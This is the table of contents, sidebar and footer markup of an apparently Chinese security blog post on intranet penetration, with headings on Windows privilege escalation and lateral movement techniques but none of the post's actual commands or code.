class="toc-text">Bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">2.6.1.</span> <span class="toc-text">UAC白名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">2.6.2.</span> <span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E4%BB%BB%E7%9B%AE%E5%BD%95"><span class="toc-number">2.6.3.</span> <span class="toc-text">模拟可信任目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="toc-number">2.6.4.</span> <span class="toc-text">相关辅助工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%93%8D%E4%BD%9C"><span class="toc-number">2.7.</span> <span class="toc-text">用户凭据操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEUnattended%E5%87%AD%E6%8D%AE"><span class="toc-number">2.7.1.</span> <span class="toc-text">枚举Unattended凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">2.7.2.</span> <span class="toc-text">组策略首选项提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HiveNightmare"><span class="toc-number">2.8.</span> <span class="toc-text">HiveNightmare</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zerologin%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83"><span class="toc-number">2.9.</span> <span class="toc-text">Zerologin域内提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Print-Spooler"><span class="toc-number">2.10.</span> <span class="toc-text">Print Spooler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintDemon"><span class="toc-number">2.10.1.</span> <span class="toc-text">PrintDemon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintNightmare"><span class="toc-number">2.10.2.</span> <span class="toc-text">PrintNightmare</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nopac%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83"><span class="toc-number">2.11.</span> <span class="toc-text">Nopac域内提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Certifred%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.</span> <span class="toc-text">Certifred域内提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%87%AD%E8%AF%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-number">2.13.</span> <span class="toc-text">无凭证条件下的权限获取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Powershell-%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text">Windows Powershell 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-number">3.2.</span> <span class="toc-text">执行策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">3.4.</span> <span class="toc-text">常用参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E7%A7%BB%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">4.1.</span> <span class="toc-text">横移中的文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB"><span class="toc-number">4.1.1.</span> <span class="toc-text">通过网络共享</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IPC"><span class="toc-number">4.2.</span> <span class="toc-text">IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">4.2.1.</span> <span class="toc-text">利用命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">4.2.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E5%8E%9F%E5%9B%A0"><span class="toc-number">4.2.3.</span> <span class="toc-text">连接失败原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E5%8F%B7"><span class="toc-number">4.2.4.</span> <span class="toc-text">常见错误号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-1"><span class="toc-number">4.3.</span> <span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BASMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">4.3.1.</span> <span class="toc-text">搭建SMB服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="toc-number">4.3.2.</span> <span class="toc-text">Windows自带工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Certuil"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">Certuil</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BITSAdmin"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">BITSAdmin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell"><span class="toc-number">4.3.2.3.</span> <span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.3.2.4.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.4.</span> <span class="toc-text">创建计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B5%81%E7%A8%8B"><span class="toc-number">4.4.0.1.</span> <span class="toc-text">常规流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="toc-number">4.4.0.2.</span> <span class="toc-text">UNC路径加载执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2RDP%E5%88%A9%E7%94%A8"><span class="toc-number">4.5.</span> <span class="toc-text">远程桌面RDP利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RDP-Hijacking"><span class="toc-number">4.5.1.</span> <span class="toc-text">RDP Hijacking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PSEXEC"><span class="toc-number">4.6.</span> <span class="toc-text">PSEXEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-number">4.7.</span> <span class="toc-text">WMI</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="内网学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网学习"/></a><div class="content"><a class="title" href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="内网学习">内网学习</a><time datetime="2023-02-21T05:57:41.000Z" title="Created 2023-02-21 13:57:41">2023-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Webshell工具学习"/></a><div class="content"><a class="title" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习">Webshell工具学习</a><time datetime="2023-01-21T05:30:21.000Z" title="Created 2023-01-21 13:30:21">2023-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2022NOV月赛"/></a><div class="content"><a class="title" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛">DASCTF2022NOV月赛</a><time datetime="2022-11-30T12:58:56.000Z" title="Created 2022-11-30 20:58:56">2022-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022"><img src="/imgg/3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安洵杯2022"/></a><div class="content"><a class="title" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022">安洵杯2022</a><time datetime="2022-11-28T08:59:18.000Z" title="Created 2022-11-28 16:59:18">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022"><img src="/imgg/2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GeekChallenge2022"/></a><div class="content"><a class="title" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022">GeekChallenge2022</a><time datetime="2022-11-26T12:22:29.000Z" title="Created 2022-11-26 20:22:29">2022-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>